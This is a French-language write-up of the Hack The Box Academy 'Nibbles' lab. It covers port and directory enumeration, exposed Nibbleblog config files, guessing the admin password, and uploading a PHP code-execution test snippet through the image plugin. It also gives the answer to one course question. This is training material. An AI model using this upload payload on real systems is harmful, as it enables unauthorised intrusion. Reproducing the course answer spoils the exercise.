---
title: "HackTheBox - Attacking your first box"
date: 2025-11-11 12:43:00 +0200
categories: [HackTheBox, Learning]
tags: [learning]
description: "Write-up du module Attacking your first Box"
image:
  path: /assets/img/posts/getting-started.png
  alt: "Attacking your first box"
---

## Informations sur la room

Découvrez le cours HTB sur notre première box HTB -> Nibbles

**Lien :** [Attacking your first box](https://academy.hackthebox.com/beta/module/77/section/850)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Apprendre a faire une box pas à pas sur HTB

---

## Nibbles - Enumeration

Au moment de la rédaction de ce document, **la plateforme HTB propose 201 machines virtuelles autonomes**, fonctionnant sous différents systèmes d'exploitation et présentant divers niveaux de difficulté, accessibles aux **membres VIP**. Cet abonnement inclut une solution complète et officielle, créée par HTB, pour chaque machine retirée du service. Une simple recherche Google permet également de trouver des **solutions en ligne** (articles de blog et vidéos) pour la plupart des machines.

Pour illustrer notre propos, nous allons analyser la machine `Nibbles`, une machine Linux de `difficulté facile` qui présente des techniques d'**énumération courantes, l'exploitation basique d'applications web et une erreur de configuration** liée aux fichiers permettant d'élever ses privilèges.

![Nibbles](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_card.png)

Commençons par examiner quelques statistiques sur la machine :

| Machine Name | Nibbles |
|--------------|---------|
| **Creator** | mrb3n |
| **Operating System** | Linux |
| **Difficulty** | Easy |
| **User Path** | Web |
| **Privilege Escalation** | World-writable File / Sudoers Misconfiguration |
| **Ippsec Video** | https://www.youtube.com/watch?v=s_0GcRGv6Ds |
| **Walkthrough** | https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html |

Notre première étape, lorsque nous abordons une machine, consiste à `effectuer une énumération de base`. Commençons par recenser les informations dont nous disposons sur la cible : 

- Son adresse IP
- Le fait qu'elle utilise Linux
- Elle présente un vecteur d'attaque web. 

On parle alors d'approche `grey box`, **car nous possédons déjà certaines informations sur la cible**. Sur la plateforme HTB, les 20 machines « actives » mises à jour chaque semaine sont toutes abordées selon une approche `black box`. Les utilisateurs reçoivent l'adresse IP et le type de système d'exploitation à l'avance, mais aucune information supplémentaire sur la cible pour concevoir leurs attaques. C'est pourquoi une énumération exhaustive est essentielle et souvent un processus itératif.

Avant de poursuivre, revenons brièvement sur les différentes approches des tests d'intrusion. Il en existe trois principales : 

- **black box**
- **grey box**
- **white box**

Chacune se distinguant par son objectif et son approche.

| Engagement | Description |
|------------|-------------|
| **Black-Box** | Niveau de connaissance faible à nul d'une cible. Le testeur d'intrusion doit effectuer une reconnaissance approfondie pour en apprendre davantage sur la cible. Il peut s'agir d'un test d'intrusion externe où le testeur ne reçoit que le nom de l'entreprise sans autres informations telles que les adresses IP cibles, ou d'un test d'intrusion interne où le testeur doit soit contourner les contrôles pour obtenir un accès initial au réseau, soit peut se connecter au réseau interne mais n'a aucune information sur les réseaux/hôtes internes. Ce type de test d'intrusion simule le mieux une attaque réelle mais n'est pas aussi complet que d'autres types d'évaluation et pourrait laisser des erreurs de configuration/vulnérabilités non découvertes. |
| **Grey-Box** | Dans un test grey-box, le testeur reçoit une certaine quantité d'informations à l'avance. Il peut s'agir d'une liste d'adresses IP/plages dans le périmètre, d'identifiants de bas niveau pour une application web ou Active Directory, ou de certains diagrammes d'application/réseau. Ce type de test d'intrusion peut simuler un initié malveillant ou voir ce qu'un attaquant peut faire avec un faible niveau d'accès. Dans ce scénario, le testeur passera généralement moins de temps sur la reconnaissance et plus de temps à rechercher des erreurs de configuration et à tenter l'exploitation. |
| **White-Box** | Dans ce type de test, le testeur reçoit un accès complet. Dans un test d'application web, il peut recevoir des identifiants de niveau administrateur, l'accès au code source, des diagrammes de construction, etc., pour rechercher des vulnérabilités logiques et d'autres failles difficiles à découvrir. Dans un test réseau, il peut recevoir des identifiants de niveau administrateur pour approfondir Active Directory ou d'autres systèmes à la recherche d'erreurs de configuration qui pourraient autrement être manquées. Ce type d'évaluation est très complet car le testeur aura accès aux deux côtés d'une cible et effectuera une analyse exhaustive. |

### Nmap

Commençons par un `scan nmap rapide` pour rechercher les **ports ouverts** à l'aide de la commande `nmap -sV --open -oA nibbles_initial_scan <adresse_ip>`. Cette commande effectuera une énumération de services (`-sV`) sur les 1 000 ports les plus utilisés par défaut et ne renverra que les ports ouverts (`--open`). Pour vérifier quels ports nmap analyse pour un type de scan donné, nous pouvons lancer un scan sans cible spécifiée, avec la commande `nmap -v -oG -`. Dans ce cas, **les résultats seront affichés sur la sortie standard** (stdout) au format `-oG -`, et `-v` active un **affichage détaillé**. Comme aucune cible n'est spécifiée, le scan échouera, mais affichera les ports analysés.

```bash
Arcony@htb[/htb]$ nmap -v -oG -

# Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG -

# Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389) UDP(0;) SCTP(0;) PROTOCOLS(0;)

WARNING: No targets were specified, so 0 hosts scanned.

# Nmap done at Wed Dec 16 23:22:26 2020 -- 0 IP addresses (0 hosts up) scanned in 0.04 seconds
```

Enfin, nous exporterons tous les formats d'analyse à l'aide de l'option `-oA`. Cela inclut les **sorties XML, les sorties exploitables par grep et les sorties texte** qui pourraient nous être utiles ultérieurement. Il est essentiel de prendre l'habitude de prendre des `notes détaillées et d'enregistrer toutes les sorties de la console` dès le début. Plus nous nous entraînerons, plus cela deviendra automatique lors de missions réelles. **Une prise de notes rigoureuse est cruciale** pour nous, testeurs d'intrusion; elle accélérera considérablement le processus de rédaction des rapports et garantira qu'aucune preuve ne soit perdue. Il est également essentiel de conserver des journaux détaillés et horodatés des analyses et des tentatives d'exploitation en cas de panne ou d'incident où le client a besoin d'informations sur nos activités.

```bash
Arcony@htb[/htb]$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.190

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:18 EST

Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 991 closed ports, 7 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

D'après les premiers résultats d'analyse, l'hôte semble être **une distribution Ubuntu Linux** et expose un **serveur web Apache sur le port 80** et un **serveur OpenSSH sur le port 22**. SSH ([Secure Shell](https://en.wikipedia.org/wiki/Secure_Shell)) est un protocole généralement utilisé pour l'accès distant aux hôtes Linux/Unix. SSH peut également être utilisé pour accéder aux hôtes Windows et est intégré nativement à Windows 10 depuis la version 1809. On constate également que les trois types de résultats d'analyse ont été générés dans notre répertoire de travail.

```bash
Arcony@htb[/htb]$ ls

nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml
```

Avant d'explorer les ports ouverts, nous pouvons effectuer une analyse complète des **ports TCP** à l'aide de la commande `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190`. Cela permettra de **détecter les services fonctionnant sur des ports non standard** que notre analyse initiale aurait pu manquer. Comme cette analyse couvre les `65 535 ports TCP`, son exécution peut être longue selon le réseau. Nous pouvons la laisser tourner en arrière-plan et poursuivre notre énumération. L'utilisation de `nc` pour récupérer les bannières réseau confirme les informations fournies par `nmap` : la cible exécute un serveur web Apache et un serveur OpenSSH.

```bash
Arcony@htb[/htb]$ nc -nv 10.129.42.190 22

(UNKNOWN) [10.129.42.190] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

`nc` nous indique que le **port 80** exécute un serveur HTTP (web) mais n'affiche pas la bannière.

```bash
Arcony@htb[/htb]$ nc -nv 10.129.42.190 80

(UNKNOWN) [10.129.42.190] 80 (http) open
```

En consultant notre autre fenêtre de terminal, nous constatons que l'analyse complète des ports (`-p-`) est terminée et n'a détecté **aucun port supplémentaire**. Effectuons maintenant **une analyse par script nmap** à l'aide de l'option `-sC`. Cette option utilise les scripts par défaut, listés ici. Ces scripts **pouvant être intrusifs**, il est essentiel de bien **comprendre le fonctionnement de nos outils**. Nous exécutons la commande : `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`. Sachant déjà quels ports sont ouverts, nous pouvons gagner du temps et limiter le trafic inutile du scanner en spécifiant les ports cibles avec l'option -p.

```bash
Arcony@htb[/htb]$ nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
```

L'analyse par script **n'a rien donné d'utile**. Poursuivons notre énumération nmap à l'aide du script `http-enum`, qui permet **d'énumérer les répertoires courants des applications web**. Cette analyse n'a pas non plus permis de découvrir quoi que ce soit d'intéressant.

```bash
Arcony@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
|_http-server-header: Apache/<REDACTED> (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
```

---

**Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**

Donc ici on me demande de run `nmap` avec un script donc déjà je sais qu'il va falloir que j'ajoute le `-sC` maintenant on va tester le script `http-enum` sur l'hôte pour avoir les versions et voici le résultat de ma commande:

```bash
┌─[eu-academy-3]─[10.10.15.31]─[htb-ac-1999270@htb-dcnzjrnfgp]─[~]
└──╼ [★]$ nmap -sV --script=http-enum 10.129.75.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 06:08 CST
Nmap scan report for 10.129.75.185
Host is up (0.056s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
```

**Réponse :** `2.4.18`

## Nibbles - Web Footprinting

Nous pouvons utiliser `whatweb` pour tenter d'identifier l'application web utilisée.

```bash
Arcony@htb[/htb]$ whatweb 10.129.42.190

http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
```

Cet outil ne détecte aucune **technologie web standard utilisée**. En accédant à la cible avec Firefox, on obtient un simple message « Hello world !».

![hi](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_hello2.png)

La consultation du code source de la page révèle un commentaire intéressant.

![comment](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_comment1.png)

On peut également le vérifier avec `cURL`.

```bash
Arcony@htb[/htb]$ curl http://10.129.42.190

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Le commentaire HTML mentionne un répertoire nommé `nibbleblog`. Vérifions cela avec `whatweb`.

```bash
Arcony@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog

http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

Nous commençons à y voir plus clair. On distingue certaines technologies utilisées, comme `HTML5`, `jQuery` et `PHP`. On constate également que le site utilise `Nibbleblog`, **un moteur de blog gratuit basé sur PHP**.

### Directory Enumeration

En accédant au répertoire `/nibbleblog` dans Firefox, nous ne voyons rien d'intéressant sur la page principale.

![nibbles](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/yumyum_.png)

Une recherche rapide sur Google avec les mots-clés `nibbleblog exploit` révèle [cette vulnérabilité de téléchargement de fichiers](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/) sur Nibbleblog. Cette faille permet à un **attaquant authentifié de télécharger et d'exécuter du code PHP** arbitraire sur le serveur web sous-jacent. Le module `Metasploit` en question est compatible avec la version **4.0.3**. Nous ignorons encore la version exacte de **Nibbleblog** utilisée, mais il est fort probable qu'elle soit vulnérable. L'analyse du code source du module Metasploit montre que l'exploit utilise les identifiants fournis par l'utilisateur pour authentifier le portail d'administration à l'adresse `/admin.php`.

Utilisons `Gobuster` pour une analyse approfondie afin de rechercher d'autres pages ou répertoires accessibles.

```bash
Arcony@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================

[+] Url:            http://10.129.42.190/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 00:10:47 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
===============================================================
2020/12/17 00:11:38 Finished
===============================================================
```

`Gobuster` s'exécute très rapidement et confirme la présence de la page `admin.php`. On peut consulter la page `README` pour obtenir des informations intéressantes, comme le numéro de version.

```bash
Arcony@htb[/htb]$ curl http://10.129.42.190/nibbleblog/README

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====

* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====

* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

<SNIP>
```

Nous vérifions donc que la version **4.0.3** est bien utilisée, confirmant ainsi sa vulnérabilité probable au module `Metasploit` (bien qu'il puisse s'agir d'une **ancienne page README**). Rien d'autre d'intéressant ne saute aux yeux. Examinons maintenant la page de connexion du portail d'administration.

![admin](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibble_admin.png)

Pour exploiter la faille mentionnée précédemment, nous avons **besoin d'identifiants d'administrateur valides**. Nous avons tenté, **sans succès**, des techniques de contournement d'autorisation et des paires d'identifiants courantes, comme `admin:admin` et `admin:password`. Une fonction de réinitialisation du mot de passe est disponible, mais nous recevons un e-mail d'erreur. De plus, des tentatives de connexion trop nombreuses et trop rapides entraînent un **verrouillage** avec le message « `Erreur de sécurité Nibbleblog - Protection par liste noire` ».

Revenons à nos résultats d'attaque par force brute sur les répertoires. Les codes d'état `200` indiquent des `pages/répertoires` directement accessibles. Les codes d'état `403` indiquent que l'accès à ces ressources est `interdit`. Enfin, le code `301` correspond à une **redirection permanente**. Examinons-les plus en détail. En accédant à `nibbleblog/themes/`, nous constatons que l'affichage des répertoires est activé sur l'application web. Peut-être trouverons-nous quelque chose d'intéressant en explorant les répertoires ?

![theme](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_dir_listing.png)

En naviguant vers `nibbleblog/content`, on découvre des **sous-répertoires intéressants** : `public, private et tmp`. Après quelques recherches, on trouve un fichier `users.xml` qui semble confirmer que le nom d'utilisateur est bien « `admin` ». Ce fichier affiche également des adresses IP sur liste noire. On peut récupérer ce fichier avec `cURL` et formater le résultat XML à l'aide de `xmllint`.

```bash
Arcony@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.2">
    <date type="integer">1608182171</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```

À ce stade, nous disposons d'un **nom d'utilisateur valide**, mais pas de mot de passe. La documentation de Nibbleblog indique que le mot de passe est **défini lors de l'installation** et qu'aucun mot de passe par défaut n'est connu. Voici les éléments dont nous disposons pour l'instant :

- Une installation de Nibbleblog **potentiellement vulnérable** à une faille de sécurité lors du téléchargement de fichiers authentifié.

- Un portail d'administration est accessible à l'adresse `nibbleblog/admin.php`.

- La liste des répertoires confirme que « `admin` » est un nom d'utilisateur valide.

- La protection contre les **attaques par force brute bloque notre adresse IP** après un trop grand nombre de tentatives de connexion infructueuses. Cela exclut toute attaque par force brute avec un outil comme [Hydra](https://github.com/vanhauser-thc/thc-hydra).

Aucun autre port n'est ouvert et nous n'avons trouvé aucun autre répertoire. Nous pouvons le confirmer en effectuant une attaque par force brute supplémentaire sur le répertoire racine de l'application web.

```bash
Arcony@htb[/htb]$ gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.42.190/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 00:36:55 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/12/17 00:37:46 Finished
===============================================================
```

En examinant à nouveau tous les répertoires exposés, nous trouvons un fichier `config.xml`.

```bash
Arcony@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.129.42.190/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>
```

La vérification, dans l'espoir d'y trouver des mots de passe, **s'avère infructueuse**. Cependant, nous constatons deux mentions de « `nibbles` » dans le titre du site ainsi que dans l'adresse e-mail de notification. Il s'agit également du nom de la box. Pourrait-il s'agir du mot de passe administrateur ?

Lorsqu'on effectue un craquage de mot de passe hors ligne avec un outil tel que `Hashcat` ou qu'on tente de deviner un mot de passe, il est important de **prendre en compte toutes les informations disponibles**. Il n'est pas rare de réussir à casser le hachage d'un mot de passe (tel que la phrase de passe du réseau sans fil d'une entreprise) à l'aide d'une liste de mots générée en explorant leur site web avec un outil tel que [CeWL](https://github.com/digininja/CeWL).

![dashboard](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_loggedin.png)

Ceci démontre l'importance cruciale d'une **énumération exhaustive**. Récapitulons nos découvertes :

- Nous avons commencé par un simple **scan nmap** révélant deux ports ouverts.

- Nous avons découvert une **instance de Nibbleblog**.

- Nous avons analysé les technologies utilisées avec `whatweb`.

- Nous avons trouvé la page de connexion administrateur à l'adresse `admin.php`.

- Nous avons constaté que l'affichage des répertoires était activé et avons exploré plusieurs répertoires.

- Nous avons confirmé que « `admin` » était un nom d'utilisateur valide.

- Nous avons appris, à nos dépens, que le blocage des adresses IP était activé **pour empêcher les attaques par force brute**.

- Des indices nous ont permis de **trouver le mot de passe administrateur** valide de nibbles.

Ceci prouve la nécessité d'un processus clair et reproductible, applicable systématiquement, que ce soit pour attaquer une machine unique sur HTB, réaliser un test d'intrusion d'une application web pour un client ou attaquer un environnement `Active Directory` de grande envergure. N'oubliez pas que **l'énumération itérative**, associée à une prise de notes détaillée, **est essentielle à la réussite dans ce domaine**. Au fil de votre carrière, vous serez souvent surpris de constater à quel point la portée initiale d'un test d'intrusion semblait extrêmement réduite et « ennuyeuse », mais qu'une fois que vous creusez et effectuez de nombreuses séries d'énumérations et que vous retirez les couches, vous pouvez trouver un **service exposé sur un port élevé** ou une page ou un répertoire oublié qui peut conduire à l'exposition de données sensibles ou même à une prise d'otages.

## Nibbles - Initial Foothold

Maintenant que nous sommes connectés au portail d'administration, nous devons tenter **d'exploiter cet accès** pour exécuter du code et obtenir un accès **reverse shell au serveur web**. Nous savons qu'un module `Metasploit` devrait convenir, mais explorons le portail d'administration à la recherche d'autres failles de sécurité. En y regardant de plus près, nous trouvons les pages suivantes :

| Page | Contenu |
|------|---------|
| `Publish` | Permet de créer un nouveau post, un post vidéo, un post de citation ou une nouvelle page. Cela pourrait être intéressant. |
| `Comments` | N'affiche aucun commentaire publié. |
| `Manage` | Permet de gérer les posts, pages et catégories. Nous pouvons éditer et supprimer des catégories, pas particulièrement intéressant. |
| `Settings` | En faisant défiler vers le bas, on confirme que la version vulnérable 4.0.3 est utilisée. Plusieurs paramètres sont disponibles, mais aucun ne semble utile pour nous. |
| `Themes` | Permet d'installer un nouveau thème à partir d'une liste présélectionnée. |
| `Plugins` | Permet de configurer, installer ou désinstaller des plugins. Le plugin `My image` permet de télécharger un fichier image. Cela pourrait-il être exploité pour télécharger potentiellement du code `PHP` ? |

Créer une nouvelle page et y intégrer du code ou télécharger des fichiers **ne semble pas être la bonne solution**. Consultons la page des extensions.

![extensions](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/plugins.png)

Essayons d'utiliser ce plugin pour téléverser un extrait de code `PHP` au lieu d'une image. L'extrait suivant permet de tester l'exécution du code.

```php
<?php system('id'); ?>
```

Enregistrez ce code dans un fichier, puis cliquez sur le bouton `Browse` et téléchargez-le.

![browse](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/upload.png)

Nous recevons de nombreuses erreurs, mais il semblerait que le fichier ait pu être téléchargé.

```bash
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

